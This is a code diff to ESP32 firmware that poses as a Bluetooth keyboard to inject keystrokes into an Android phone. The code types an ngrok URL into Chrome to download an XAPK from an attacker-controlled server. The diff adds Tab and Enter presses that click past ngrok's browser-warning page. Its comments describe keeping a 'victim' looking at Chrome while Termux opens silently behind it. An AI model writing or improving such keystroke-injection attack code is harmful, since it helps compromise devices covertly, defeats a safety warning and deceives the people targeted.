@@ -29,7 +29,7 @@
 #include <BleKeyboard.h>
 
 #define BUTTON_PIN     19
-#define WAN_SERVER_URL "https://f870-2409-40c1-2d-fd51-acac-8c9d-4441-a05a.ngrok-free.app"
+#define WAN_SERVER_URL "https://e173-2409-40c1-2d-fd51-a9de-a553-6358-321.ngrok-free.app"
 
 BleKeyboard bleKeyboard("ESP32 Keyboard", "Espressif", 100);
 
@@ -91,17 +91,36 @@ void openChromeDistraction() {
   bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('l');
   delay(120); bleKeyboard.releaseAll(); delay(700);
 
-  // Navigate to the XAPK download URL served from server/apk/
-  // Chrome will hit /apk/<filename> → server sends Content-Disposition: attachment
-  // → Android download manager intercepts → "Download" prompt appears on screen
+  // Navigate to the XAPK download URL
   typeString(WAN_SERVER_URL "/apk/" APK_FILENAME, 40);
-  pressEnter(5000);  // wait 5 s — time for ngrok round-trip + download prompt
+  pressEnter(4000);  // wait 4 s for page to load
 
-  Serial.println("  [apk] XAPK download prompt should be visible in Chrome.");
+  // ── Bypass the ngrok browser-warning interstitial ────────────────────
+  // ngrok shows a "You are about to visit…" page with a "Visit Site" button
+  // when Chrome makes a plain browser request (no ngrok-skip-browser-warning
+  // header). The firmware bypasses it by pressing Tab to focus the button
+  // then Enter to click it.
+  //
+  //   Tab   → moves focus to the "Visit Site" button
+  //   Enter → clicks it → Chrome proceeds to the actual URL
+  //
+  // We press Tab twice to be safe (some ngrok pages have a hidden skip link
+  // before the Visit button). After Enter the actual /apk/ download triggers.
+  Serial.println("  [apk] Bypassing ngrok warning page — pressing Tab+Enter...");
+  bleKeyboard.press(KEY_TAB);
+  delay(100); bleKeyboard.releaseAll(); delay(400);
+
+  bleKeyboard.press(KEY_TAB);
+  delay(100); bleKeyboard.releaseAll(); delay(400);
+
+  bleKeyboard.press(KEY_RETURN);
+  delay(100); bleKeyboard.releaseAll();
+  delay(5000);  // wait 5 s — Visit Site clicked → download prompt appears
+
+  Serial.println("  [apk] XAPK download prompt should now be visible.");
   Serial.println("  [apk] Going Home — Chrome stays in foreground, Termux opens behind.");
 
-  // Win key — backgrounds Chrome (download prompt stays in notification bar),
-  // victim sees Chrome / download toast, not Termux.
+  // Win → Home — Chrome/download stays visible, Termux opens silently next
   goHome(1200);
 }
 
